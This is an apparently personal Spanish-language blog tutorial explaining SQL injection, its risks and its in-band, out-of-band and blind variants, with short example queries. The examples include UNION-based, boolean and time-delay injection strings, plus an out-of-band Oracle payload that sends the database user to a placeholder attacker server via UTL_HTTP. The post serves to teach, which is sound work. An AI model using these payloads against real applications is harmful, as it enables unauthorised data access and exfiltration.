---
layout: single
title: ¿Qué es Inyección de SQL?
excerpt: "Inyección de SQL es una vulnerabilidad de una aplicación web que permite al atacante introducir instrucciones SQL dentro del código SQL programado para la manipulación de la base de datos."
date: 2021-11-28
classes: wide
header:
  teaser: /assets/images/que-es-inyeccion-sql\Ilustracion_Inyeccion_SQL.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - SQL Injection
tags:
  - SQL Injection
---
<p align="center">
  <img width="500" src="../assets/images/que-es-inyeccion-sql\Ilustracion_Inyeccion_SQL.png">
</p>

***Inyección de SQL*** es una vulnerabilidad de una aplicación web que permite al atacante introducir instrucciones SQL dentro del código SQL programado para la manipulación de la base de datos.

Un ataque de inyección SQL exitoso puede:
- Leer datos sensibles de una base de datos.
- Modificar información de la base de datos con consultas INSERT/UPDATE/DELETE. 
- Ejecutar operaciones administrativas en la base de datos (como apagarla).
- Extraer contenido de los archivos que existen en el sistema de archivos de la base de datos.
- Escribir archivos en el sistema de archivos.
- Emitir otro tipo de comandos al sistema operativo.

## Los 10 principales riesgos de seguridad de las aplicaciones web:
<p align="center">
  <img src="../assets/images/que-es-inyeccion-sql\Top_ten_OWASP.png">
</p> 

*Fuente: https://owasp.org/www-project-top-ten/*

## Las principales categorías de las inyecciones SQL son:
- In-band
- Out-of-band
- Inferential (Blind)

## 1. In-band (Inyecciones SQL clásicas):  
Los atacantes pueden lanzar el ataque y obtener los resultados por el mismo canal de comunicación.

**Técnicas populares:**

- **Error-based Injections:** Podemos obtener información de la base de datos, su estructura y su información a partir de mensajes de error. *Ejemplo: Poner comillas simples o dobles en un campo de búsqueda.* Además, conociendo el gestor de bases de datos podemos darnos cuenta que tabla contiene información importante de la base de datos (tabla con metadatos de la base de datos):

![](/assets/images/que-es-inyeccion-sql\Tablas_metadatos_gestores_bd.png)

- **Union-based Injections:** Combina los resultados de una consulta legítima con los resultados de la consulta que un atacante realizó. 

*Ejemplo:*
```sql
SELECT Email,RegistrationDate FROM Users WHERE ID='159' UNION SELECT 
ProductName,ProductDescription FROM Products;
```

## 2. Out-of-band:  
Similar a la anterior pero se usan diferentes canales para la extracción de la información producto del ataque (HTTP, DNS). *Por ejemplo, hacer una conexión HTTP con otro servidor web para enviar los resultados del ataque.*

![](/assets/images/que-es-inyeccion-sql\ilustracion_out_of_band.png)

Requerimientos:
- Tener una aplicación web y base de datos vulnerable.
- Ganar suficientes privilegios para iniciar una petición.

<!-- &emsp; para 4 espacios -->

*Ejemplo:*
```sql
SELECT * FROM Products WHERE id='346'||UTL_HTTP.request('http://attacker
-server-url.com/'||(SELECT user FROM DUAL)) --
```

## 3. Inferential or Blind:  
A menudo es usado para generar retrasos en la base de datos ( sleep(10) ) o condiciones booleanas (1=1).  

*Ejemplo:*

Condición booleana:
```sql
SELECT * FROM Products WHERE ID='346' OR 1=1;
```

Un retraso en SQL Server:  
```sql
SELECT * FROM Products WHERE ID='346' waitfor delay '00:00:10';
```

O un retraso en MySQL:
```sql
SELECT * FROM Products WHERE ID='346' - SLEEP(10);
```

## Materiales de referencia para Inyección SQL: 

[https://slides.com/christophe-cybr/sql-explained](https://slides.com/christophe-cybr/sql-explained)